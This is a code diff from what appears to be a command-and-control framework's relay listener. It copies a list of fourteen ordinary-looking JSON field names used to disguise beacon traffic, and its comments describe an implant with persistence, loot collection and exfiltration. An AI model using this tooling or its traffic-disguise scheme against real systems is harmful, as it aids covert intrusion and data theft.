@@ -27,11 +27,27 @@ from typing import Optional
 # request must land in the named loop. ServerCrypto.wrap picks one of them
 # at random for its answer, which is why finding it means scanning.
 #
-# Imported from the beacon rather than the server: both modules carry the
-# identical list, and the beacon is stdlib-only while the server drags in
-# five third-party packages. One source, no duplication, no flask in a
-# listener container.
-from ..beacon import _PAYLOAD_FIELDS
+# Copied, not imported, and that is a reversal. It used to be
+# `from ..beacon import _PAYLOAD_FIELDS`, chosen because the beacon is
+# stdlib-only while the server drags in five third-party packages -- one
+# source and no flask in a listener container.
+#
+# But it also meant a listener container had to carry `beacon.py`, and
+# that file is the whole implant: persistence, loot collection, the SMB
+# browser, exfiltration. Shipping all of it into the one process that
+# faces the network, so that a listener can know fourteen field names, is
+# the wrong trade. `beacon.py` cannot import them from a shared module
+# either: the beacon generator serves that file as source text for a
+# single-file implant, which would have no such module on the target.
+#
+# So this is the third copy, after `beacon.py` and `server.py`, which
+# already carried two with a comment asking them to match and no test
+# holding it. There is a test now, and it covers all three.
+_PAYLOAD_FIELDS = [
+    "session_token", "auth_hash", "state_key", "nonce", "validation",
+    "api_key", "request_token", "cipher_text", "payload_data", "signature",
+    "trace_id", "correlation_id", "request_id", "transaction_id",
+]
 
 logger = logging.getLogger("raccoon.listeners.relay")
 
